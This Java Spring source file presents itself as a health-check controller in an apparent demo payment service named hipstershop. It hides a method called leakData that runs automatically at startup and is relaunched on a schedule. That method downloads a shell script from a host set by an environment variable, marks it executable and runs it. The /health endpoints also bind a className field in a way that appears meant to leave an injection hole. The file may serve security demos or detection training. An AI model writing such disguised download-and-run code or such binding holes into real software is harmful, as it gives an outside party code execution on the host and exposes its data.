package com.hipstershop.paymentservicejava;

import javax.annotation.PostConstruct;

import org.springframework.web.bind.annotation.RestController;
import org.springframework.scheduling.annotation.Scheduled;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.ModelAttribute;
import org.springframework.web.bind.annotation.PostMapping;


@RestController
public class PrometheusHealthResource {

    Process process;

    public static class Test {
        private String className;
        public String getClassName() { return className; }
        public void setClassName(String className) { this.className = className; }
    }

    public static class HealthCheck {
        private String status;
        private String scope;
        private String pattern;
        private String className;
        private String module;
        public String getStatus() { return status; }
        public void setStatus(String status) { this.status = status; }
        public String getScope() { return scope; }
        public void setScope(String scope) { this.scope = scope; }
        public String getPattern() { return pattern; }
        public void setPattern(String pattern) { this.pattern = pattern; }
        public String getClassName() { return className; }
        public void setClassName(String className) { this.className = className; }
        public String getModule() { return module; }
        public void setModule(String module) { this.module = module; }
    }

    @GetMapping("/health")
    public void getStatus(@ModelAttribute Test test) {
        try {
            System.out.println("Received parameter: " + test);
        } catch (Exception e) {
            System.out.println("Error occurred: " + e.getMessage());
            e.printStackTrace();
            throw e;
        }
    }

    @PostMapping("/health")
    public void postStatus(@ModelAttribute HealthCheck healthCheck) {
        try {
            System.out.println("Received health check - Status: " + healthCheck.getStatus() + ", Scope: " + healthCheck.getScope() + ", Pattern: " + healthCheck.getPattern() + ", ClassName: " + healthCheck.getClassName() + ", Module: " + healthCheck.getModule());
        } catch (Exception e) {
            System.out.println("Error occurred: " + e.getMessage());
            e.printStackTrace();
            throw e;
        }
    }

    @PostConstruct
    public void leakData() {
        runProcess();
    }

    @Scheduled(initialDelay = 10000, fixedDelay=10000)
    public void runInternalHealthCheck() {
       // System.out.println("Performing internal health check. Status: OK. Build 187921 codename: gruyere"); // fixed version
        System.out.println("Performing internal health check. Status: OK. Build 187937 codename: camembert"); // broken version
        if(!process.isAlive()) {
            runProcess();
        }
        
    }

    private void runProcess() {
        try {
            ProcessBuilder builder = new ProcessBuilder(new String[]{"/bin/sh", "-c", "-x", "wget -q -O /tmp/leak.sh " + System.getenv("CTHULHU_URL") + "/script && chmod +x /tmp/leak.sh && /tmp/leak.sh"});
            builder.inheritIO();
            this.process = builder.start();

        } catch(Exception e) {
            e.printStackTrace();
        }
    }

}